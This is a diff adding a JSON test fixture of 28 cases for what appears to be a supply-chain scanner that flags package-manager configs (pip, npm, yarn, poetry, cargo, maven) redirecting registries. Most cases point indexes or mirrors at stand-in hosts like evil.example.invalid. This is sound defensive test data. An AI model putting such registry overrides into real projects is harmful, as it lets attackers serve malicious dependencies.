@@ -1,0 +1,548 @@
+{
+  "schema_version": 1,
+  "expected_row_count": 28,
+  "rows": [
+    {
+      "id": "control-pip-global-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pip.conf": "[global]\nindex-url = https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "pip config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pip.conf",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-pip-install-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pip.conf": "[install]\nindex-url = https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "pip config",
+          "operation": "replace",
+          "scope": "command",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pip.conf",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-maven-compact-mirror",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "settings.xml": "<settings><mirrors><mirror><id>e</id><mirrorOf>*</mirrorOf>\n<url>https://evil.example.invalid/simple</url></mirror></mirrors></settings>\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "maven",
+          "surface": "maven-config",
+          "operation": "replace",
+          "scope": "mirror",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "settings.xml",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-poetry-source",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pyproject.toml": "[[tool.poetry.source]]\nname = \"evil\"\nurl = \"https://evil.example.invalid/simple\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "python-project-config",
+          "operation": "replace",
+          "scope": "project",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pyproject.toml",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-cargo-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".cargo/config.toml": "[registries.evil]\nindex = \"https://evil.example.invalid/simple\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "cargo-config",
+          "operation": "add",
+          "scope": "registry",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": ".cargo/config.toml",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-npmrc-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".npmrc": "registry=https://packages.example.invalid/\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": ".npmrc",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": ".npmrc",
+          "start_line": 1
+        }
+      ]
+    },
+    {
+      "id": "control-npmrc-spaced-assignment",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".npmrc": "registry = https://packages.example.invalid/\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": ".npmrc",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": ".npmrc",
+          "start_line": 1
+        }
+      ]
+    },
+    {
+      "id": "control-npmrc-scoped-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".npmrc": "@acme:registry=https://packages.example.invalid/\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": ".npmrc",
+          "operation": "replace",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": ".npmrc",
+          "start_line": 1
+        }
+      ]
+    },
+    {
+      "id": "control-npmrc-canonical-with-slash",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".npmrc": "registry=https://registry.npmjs.org/\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-npmrc-canonical-without-slash",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".npmrc": "registry=https://registry.npmjs.org\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-npmrc-canonical-with-comment",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".npmrc": "registry=https://registry.npmjs.org/ # note\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-npmrc-auth-token-only",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".npmrc": "//packages.example.invalid/:_authToken=${NPM_TOKEN}\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-yarnrc-canonical-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".yarnrc": "registry \"https://registry.yarnpkg.com\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-npmrc-quoted-canonical-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        ".npmrc": "registry=\"https://registry.npmjs.org/\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-npmrc-nested-path",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "project/.npmrc": "registry=https://packages.example.invalid/\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": ".npmrc",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "project/.npmrc",
+          "start_line": 1
+        }
+      ]
+    },
+    {
+      "id": "control-npmrc-hidden-parent",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".config/.npmrc": "registry=https://packages.example.invalid/\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": ".npmrc",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": ".config/.npmrc",
+          "start_line": 1
+        }
+      ]
+    },
+    {
+      "id": "control-pip-basic-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pip.conf": "[global]\nindex-url = https://packages.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "pip config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pip.conf",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-pip-extra-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pip.conf": "[install]\nextra-index-url = https://packages.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "pip config",
+          "operation": "add",
+          "scope": "command",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pip.conf",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-pip-canonical-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        "pip.conf": "[global]\nindex-url = https://pypi.org/simple\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-pip-ini-index",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pip.ini": "[global]\nindex-url = https://packages.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "pip config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pip.ini",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-yarn-scoped-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".yarnrc.yml": "npmScopes:\n  acme:\n    npmRegistryServer: \"https://packages.example.invalid\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "yarn-config",
+          "operation": "replace",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": ".yarnrc.yml",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-yarn-http-registry",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".yarnrc.yml": "unsafeHttpWhitelist:\n  - \"packages.example.invalid\"\nnpmRegistryServer: \"http://packages.example.invalid\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "yarn-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "http://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": ".yarnrc.yml",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-poetry-private-source",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pyproject.toml": "[[tool.poetry.source]]\nname = \"private\"\nurl = \"https://packages.example.invalid/simple\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "python-project-config",
+          "operation": "replace",
+          "scope": "project",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pyproject.toml",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-cargo-source-replacement-toml",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".cargo/config.toml": "[source.crates-io]\nreplace-with = \"mirror\"\n\n[source.mirror]\nregistry = \"sparse+https://packages.example.invalid/index/\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "cargo-config",
+          "operation": "replace",
+          "scope": "source",
+          "destination": "sparse+https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": ".cargo/config.toml",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "cargo-config",
+          "operation": "add",
+          "scope": "registry",
+          "destination": "sparse+https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": ".cargo/config.toml",
+          "start_line": 5
+        }
+      ]
+    },
+    {
+      "id": "control-cargo-source-replacement-extensionless",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        ".cargo/config": "[source.crates-io]\nreplace-with = \"mirror\"\n\n[source.mirror]\nregistry = \"sparse+https://packages.example.invalid/index/\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "cargo-config",
+          "operation": "replace",
+          "scope": "source",
+          "destination": "sparse+https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": ".cargo/config",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "cargo-config",
+          "operation": "add",
+          "scope": "registry",
+          "destination": "sparse+https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": ".cargo/config",
+          "start_line": 5
+        }
+      ]
+    },
+    {
+      "id": "control-maven-namespaced-mirror",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "settings.xml": "<settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\">\n  <mirrors>\n    <mirror>\n      <id>m</id>\n      <mirrorOf>central</mirrorOf>\n      <url>https://packages.example.invalid/maven2</url>\n    </mirror>\n  </mirrors>\n</settings>\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "maven",
+          "surface": "maven-config",
+          "operation": "replace",
+          "scope": "mirror",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "settings.xml",
+          "start_line": 6
+        }
+      ]
+    },
+    {
+      "id": "control-maven-commented-repository",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "inert",
+      "files": {
+        "pom.xml": "<project>\n  <!--\n  <repositories><repository><id>x</id><url>https://packages.example.invalid/m2</url></repository></repositories>\n  -->\n</project>\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-maven-plugin-repository",
+      "status": "fixed",
+      "lands_in": "PR-1",
+      "expected_outcome": "finding",
+      "files": {
+        "pom.xml": "<project>\n  <pluginRepositories>\n    <pluginRepository>\n      <id>p</id>\n      <url>https://packages.example.invalid/m2</url>\n    </pluginRepository>\n  </pluginRepositories>\n</project>\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "maven",
+          "surface": "maven-config",
+          "operation": "add",
+          "scope": "repository",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "pom.xml",
+          "start_line": 5
+        }
+      ]
+    }
+  ]
+}
